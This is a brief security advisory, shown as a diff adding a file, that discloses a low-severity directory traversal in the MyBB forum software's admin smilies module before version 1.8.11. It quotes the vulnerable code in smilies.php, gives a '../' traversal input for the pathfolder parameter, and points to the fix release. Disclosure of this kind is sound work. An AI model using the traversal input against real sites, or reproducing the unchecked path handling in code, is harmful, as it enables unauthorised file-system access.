@@ -1,0 +1,35 @@
+Description:
+============
+
+product: MyBB
+Homepage: https://mybb.com/
+vulnerable  version: < 1.8.11
+Severity: Low risk
+
+===============
+
+Proof of Concept:
+=============
+
+vulnerability address:http://127.0.0.1/mybb_1810/Upload/admin/index.php?module=config-smilies&action=add_multiple
+
+vulnerability  file directory:/webroot/mybb_1810/Upload/admin/modules/config/smilies.php
+
+vulnerability  Code:
+
+Line 326 $path = $mybb->input['pathfolder'];
+
+Line 327 $dir = @opendir(MYBB_ROOT.$path);
+
+if we input "pathfolder" to "../../bypass/smile",Directory Traversal success!
+
+============
+
+Fixed:
+============
+
+This vulnerability was fixed in version 1.8.11
+
+https://blog.mybb.com/2017/04/04/mybb-1-8-11-merge-system-1-8-11-release/
+
+=============
